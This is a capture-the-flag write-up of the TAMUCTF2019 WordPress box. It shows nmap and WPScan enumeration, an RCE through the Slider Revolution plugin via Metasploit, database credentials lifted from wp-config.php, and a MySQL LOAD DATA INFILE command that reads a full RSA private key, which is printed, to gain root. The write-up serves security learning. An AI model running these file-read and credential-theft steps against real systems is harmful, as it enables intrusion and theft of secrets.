---
layout: post
title:  "TAMUCTF2019 Wordpress Write-up"
date:   2019-05-03
categories: challenge
tags: CTF | RATF | FLAG | CHALLENGE
description: Hey guys! This post i’m my mindset on how I solved the Wordpress challenge from TAMUCTF2019
---

<small> <i> Tags: CTF | RATF | FLAG | CHALLENGE </i> </small>

Hey guys! This post i’m my mindset on how I solved the Wordpress challenge from TAMUCTF2019

This kind of challenge is very similar to those HackTheBox challenges, where you have to get RCE from a system and then escalate your privileges to root! Let’s GO.

![ratf](/img/jekyll/1/ratf.png){:class="img-responsive"}
{:class="text-center"}

![ratf](/img/jekyll/2/code.png){:class="img-responsive"}
{:class="text-center"}

As I said before our goal is to get the flag inside “/root/flag.txt” since it is inside the root folder we must become root to read it. (Most of the time)
We’re given an openvpn config file to connect to that docker network where the machine is running.

Let’s start our enumaration with nmap.

{% highlight cmd %}

nmap -sV -sC 170.30.0.3

{% endhighlight %}

And we get the following services.

{% highlight cmd %}

~/ctf/tamu/wordpress # nmap 172.30.0.3 -sV -sC                                                                                                                    root@kali
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-02 18:05 EST
Nmap scan report for 172.30.0.3
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 0d:1f:51:d6:f3:3e:07:f6:cc:0f:4f:88:12:de:e2:52 (DSA)
|   2048 75:cb:36:cf:54:fa:ed:48:99:93:d2:54:a3:b0:8e:8c (RSA)
|   256 f8:59:11:11:0f:74:31:39:55:40:2c:3a:f9:52:9c:45 (ECDSA)
|_  256 fe:af:37:4e:b6:78:d8:4f:ec:5b:71:a6:c3:64:c1:ae (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: WordPress 5.1
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: TAMUctf &#8211; Just another WordPress site
MAC Address: 02:42:C7:86:A7:37 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.34 seconds

{% endhighlight %}


Based on the nmap result, we got an ssh and HTTP Service. Cool, probably the WordPress site, so let’s focus on this.When we open the wordpress site, nothing calls our attention to explore so Iran WPScan against it.

{% highlight cmd %}

wspcan --url http://172.30.0.3
[+] revslider
 | Location: http://172.30.0.3/wp-content/plugins/revslider/
 |
 | Detected By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WordPress Slider Revolution Local File Disclosure
 |     Fixed in: 4.1.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7540
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1579
 |      - https://www.exploit-db.com/exploits/34511/
 |      - https://www.exploit-db.com/exploits/36039/
 |      - http://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html
 |      - http://packetstormsecurity.com/files/129761/
 |
 | [!] Title: WordPress Slider Revolution Shell Upload
 |     Fixed in: 3.0.96
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/7954
 |      - https://www.exploit-db.com/exploits/35385/
 |      - https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_revslider_upload_execute
 |
 | The version could not be determined.

{% endhighlight %}

This part cought my attention, apparently this wordpress is running “Slider Revolution” which seems to have a few exploits available. So I googled them a bit.

![ratf](/img/jekyll/2/alert.png){:class="img-responsive"}
{:class="text-center"}

I found this modulo on metasploit that leads to RCE directly, I ran it but no so confident It would work.

![ratf](/img/jekyll/2/code1.png){:class="img-responsive"}
{:class="text-center"}

But hey it did work and I got my reverse shell! Cool, part 1 finished.

Next step is to figure out how we can escalate our privileges to root. Let’s enumerate.

Without going very far I found an interesting file in /var/www called note.txt.

{% highlight cmd %}

Your ssh key was placed in /backup/id_rsa on the DB server.

{% endhighlight %}

Hum? So the mysql database running for the wordpress, is not running in this server? Let’s find out where it is.

By going through the Wordpress config files we must check wp-config.php.

{% highlight sql %}

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', '0NYa6PBH52y86C');

/** MySQL hostname */
define('DB_HOST', '172.30.0.2');

{% endhighlight %}

That’s interesting, we got DB_NAME, DB_USER, DB_PASSWORD and DB_HOST

At this time the challenge is basically over. Let’s connect to the mysql server.

{% highlight cmd %}

~/ctf/tamu/wordpress # mysql -h 172.30.0.2 -u wordpress -p0NYa6PBH52y86C   
root@kali Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 65
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL>

{% endhighlight %}

We got our connection, so we’re inside the 172.30.0.2 where the backup ssh key is stored at /backup/id_rsa all we have to do now is read this file with mysql.

So i created a table foo inside Mysql database.

{% highlight cmd %}

MySQL [mysql]> create table foo(line blob);
Query OK, 0 rows affected (0.20 sec)

MySQL [mysql]>

{% endhighlight %}

Then I loaded the content of the ssh key file inside the table.

{% highlight cmd %}

MySQL [mysql]> LOAD DATA infile '/backup/id_rsa' INTO TABLE foo;
Query OK, 27 rows affected (0.20 sec)
Records: 27  Deleted: 0  Skipped: 0  Warnings: 0
MySQL [mysql]> select * from foo
    -> ;
+------------------------------------------------------------------+
| line                                                             |
+------------------------------------------------------------------+
| -----BEGIN RSA PRIVATE KEY-----                                  |
| MIIEpAIBAAKCAQEA3Z35DpTcnm4kFkkGp6iDXqvUNH+/+hSDOY6rXsa40WMr7rjc |
| tHh8TgOBFZ6Rj5VzU/jY8O0qHxiPVn7BCYKhqyp1V1l9/ZCPRSjRLYy62dVTiHUt |
| ZbiPiY9+biHIsQ/nZfwiHmwlb0sWDoyFvX3OL/3AFMcYpZ4ldHQuwszJF4DeTV33 |
| ruSBoXIiICQyNJBHTboVel+WXAfMNumYMVNrtrwpNoD7whv9Oa2afUejXMJL42Rw |
| 8Xhab59HIIL9fl68FqgggVI4X3d/fzqKKGyoN5JxBLmQTCiVxhxTMv9OS0MhdSg6 |
| Nh3+lf/wUuweUQXqmohvETntwwGs8jnJGCyeDwIDAQABAoIBAHGVRpG/n/cfMiWt |
| 1dhWGMaLwJ4Ln6QXoU39nj1cEltWvayDWLKyUdtWFnGzLJ1vloVCNEX+96iqWMSX |
| AG7UYfGtOCjFuDoePh/PFK6IwzdkC4UTsWnCFucFAWKGtCpzoUB24jG/ccxBqpNY |
| WC9PbD7SigDcLfisPjwaU+EJPkNpl93VBk1BCJRbvWF+Wl/si3wmMZ0YRoyIAF5L |
| oBsq935xH8kJcixSVYKjG3hMUZfiLoQB+p/IFsxDlfGLE+M1esTZ5GIRjj+t7vBN |
| l2JZTY893gjfQzUv2WrJXzMhJvWGzOCsRRc4gOSeS6GYiip8glqg8iWHpWdgF6i9 |
| oAQx5pkCgYEA7oTmvy0cXvhPjkEbrizCCqf6sXfZps5e6eminTTBGA8NW/Uq+SQv |
| 5JEYxvIL+qMH6cKkc8rBaNhgy3vnv+UgE1PUFI0UWFGKb+OpzzvY/zkmf03enxrl |
| SK+QXH4FS9f7leivZRVEWBq1kDVIqHZtybYGg0etOvHYX0GwqV2UTy0CgYEA7dv0 |
| bxz6CO9bhxxpXRrrykX2Z57J3JW2I3yVkCY+4Y6x106K11X+b1547kEZk40i2Ugc |
| iE6jcYIRiYNiSgb0Ph4uxZHFlvBr8JA2fGHYIAnGRcoc1Gzgz5omRvU9H8uy5ipO |
| LyZ2dnMgXRVOjuXoN4UZR2rgWmJVLD1q7eKnh6sCgYAnVOUUC2VNR9celx/wZdMN |
| nMubLi9G8Wr3WZ6GG+fnhrvmORSABvaa005pqApPp0irxHwH2BxypJO5mlIJ88eJ |
| SF6FkQoU0kVo0/rxgGX1GEB/56BZTj8W8FR23BUVf6UuADPEEHC3spfUEuVLWlQa |
| WhjS1yP6v1y1wIhYNWU6dQKBgQDbZ1zdcXkh7MgcpRR7kW2WM1rK0imZk29i5HSB |
| dwXhwWJCHGztnKEJ0bby7pHNDQ7sJhxLj14sQbIzikGLz0ZUVjsGeyQryrGGQUBB |
| E2/sfZeqoHhfad8lICfWpDgxsA/hR3y++VekgyWDNzgzj9bX/6oFuowgUzwFhtGv |
| hLbL6QKBgQCvcDMmWs2zXwmIo1+pIHUUSv2z3MWb0o1dzHQI/+FJEtyQPwL1nCwg |
| bJaC0KT45kw0IGVB2jhWf0KcMF37bpMpYJzdsktSAmHdjLKdcr6vw2MNpRapaNQe |
| On0QmLzbpFr9kjqorinKVkjk/WlTo9rKDSrLiUueEVYTxEMCi92giw==         |
| -----END RSA PRIVATE KEY-----                                    |
+------------------------------------------------------------------+
27 rows in set (0.20 sec)

{% endhighlight %}

I copied this private to my local computer and used to log via ssh.

![ratf](/img/jekyll/2/code2.png){:class="img-responsive"}
{:class="text-center"}


And we got Root!

{% highlight cmd %}
gigem{w0rd_pr3ss_b3st_pr3ss_409186FC8E2A45FE}
{% endhighlight %}

Hope you guys enjoyed it!

by me